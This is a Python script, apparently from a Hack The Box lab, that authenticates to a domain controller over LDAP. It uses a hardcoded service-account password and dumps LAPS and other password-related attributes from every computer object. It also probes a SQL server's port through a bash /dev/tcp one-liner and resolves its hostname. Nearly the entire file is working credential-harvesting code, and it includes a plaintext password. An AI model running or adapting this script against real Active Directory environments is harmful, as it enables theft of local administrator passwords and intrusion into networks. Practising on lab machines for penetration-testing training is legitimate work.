#!/usr/bin/env python3
"""Read all LAPS attributes including new Windows LAPS"""
import sys, os

sys.path.insert(0, '/tmp/pyasn1.whl')
sys.path.insert(0, '/tmp/pyasn1m.whl')
sys.path.insert(0, '/tmp/impacket.whl')

import Crypto
sys.modules['Cryptodome'] = Crypto
import Crypto.Cipher, Crypto.Hash, Crypto.Protocol, Crypto.PublicKey, Crypto.Random, Crypto.Signature, Crypto.Util
for mod in ['Cipher','Hash','Protocol','PublicKey','Random','Signature','Util']:
    sys.modules[f'Cryptodome.{mod}'] = getattr(Crypto, mod)

import Crypto.Hash.HMAC as _hmac_mod
_orig = _hmac_mod.new
def _p(key, msg=None, digestmod=None):
    if isinstance(key, (bytearray, memoryview)): key = bytes(key)
    if isinstance(msg, (bytearray, memoryview)): msg = bytes(msg)
    return _orig(key, msg, digestmod) if digestmod else _orig(key, msg)
_hmac_mod.new = _p
import Crypto.Cipher.ARC4 as _arc4
_arc4_orig = _arc4.new
def _arc4_p(key):
    if isinstance(key, (bytearray, memoryview)): key = bytes(key)
    return _arc4_orig(key)
_arc4.new = _arc4_p

import socket
DC_IP = '172.16.1.1'
DC_FQDN = 'openAD.king.htb'
_orig_ga = socket.getaddrinfo
def _patch(host, *a, **k):
    if host and str(host).lower() in (DC_FQDN.lower(), 'openad'): host = DC_IP
    return _orig_ga(host, *a, **k)
socket.getaddrinfo = _patch

from impacket.ldap import ldap, ldapasn1

USERNAME = 'svc_laps'
PASSWORD = '16bmxkingm@'
DOMAIN = 'KING.HTB'

try:
    lc = ldap.LDAPConnection(f'ldap://{DC_FQDN}', 'dc=king,dc=htb', DC_IP)
    lc.login(USERNAME, PASSWORD, DOMAIN, '', '')
    print("[+] LDAP login ok")

    # All LAPS attributes on all computers
    print("\n[*] Full computer LAPS dump:")
    result = lc.search(
        searchFilter='(objectClass=computer)',
        attributes=['*'],
        sizeLimit=20
    )
    for entry in result:
        if isinstance(entry, ldapasn1.SearchResultEntry):
            print(f"\n  --- Computer ---")
            for attr in entry['attributes']:
                n = attr['type'].asOctets().decode('utf-8', errors='ignore')
                vals = [str(v) for v in attr['vals']]
                if any(kw in n.lower() for kw in ['laps','admpwd','name','dns','pwd','pass','admin']):
                    print(f"    {n}: {vals[:3]}")

    # Also check for sql.king.htb reachability
    import subprocess
    sql_check = subprocess.run(['timeout','3','bash','-c','echo >/dev/tcp/172.16.1.50/1433'],
                               capture_output=True)
    print(f"\n[*] SQL 172.16.1.50:1433 reachable: {sql_check.returncode == 0}")

    # DNS lookup for sql.king.htb
    try:
        sql_ip = socket.gethostbyname('sql.king.htb')
        print(f"[*] sql.king.htb resolves to: {sql_ip}")
    except Exception as e:
        print(f"[*] sql.king.htb DNS: {e}")
        # Try via dig
        dig_out = subprocess.run(['nslookup','sql.king.htb','172.16.1.1'], capture_output=True, text=True)
        print(dig_out.stdout[:200])

except Exception as e:
    print(f"[-] Error: {e}")
    import traceback; traceback.print_exc()
